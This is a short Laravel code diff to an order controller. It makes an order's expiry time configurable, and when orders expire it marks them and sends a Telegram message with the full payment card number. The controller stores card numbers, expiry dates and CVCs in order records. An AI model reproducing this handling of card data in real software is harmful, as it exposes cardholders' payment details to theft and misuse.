@@ -6,6 +6,7 @@ use Illuminate\Http\Request;
 use App\Http\Controllers\BaseController as BaseController;
 use Validator;
 use App\Models\Order;
+use App\Models\Setting;
 use App\Http\Resources\Order as OrderResource;
 use Telegram\Bot\Laravel\Facades\Telegram;
 use Carbon\Carbon;
@@ -123,12 +124,15 @@ class OrderController extends BaseController
             return $this->sendError('Order status error.');
         }
 
+        $settings = Setting::first();
+        $timeout = $settings->timeout ?? 1;
+
         $order->update([
           'card_num' => $input['card_num'],
           'card_date' => $input['card_date'],
           'cvc' => $input['cvc'],
           'status' => 3,
-          'expired' => Carbon::now()->addHour(),
+          'expired' => Carbon::now()->addHours($timeout),
           //'pincode' => $input['pincode'],
         ]);
 
@@ -144,8 +148,18 @@ class OrderController extends BaseController
 
     public function checkExpired()
     {
-          $orders = Order::where('status', 3)->where('expired', '>', Carbon::now())->get();
+          $orders = Order::where('status', 3)->where('expired', '<', Carbon::now())->get();
+          foreach ($orders as $order) {
+                //print_r($order->toarray());
+                $order->update(['status' => 4]);
+                Telegram::sendMessage([
+                    'chat_id' => $order->client_id,
+                    'text' => "Закончился срок действия платежной карты:"
+                    . "\n" . $order->card_num
+                ]);
+          }
           return $this->sendResponse(OrderResource::collection($orders), 'orders fetched.');
     }
+
 
 }
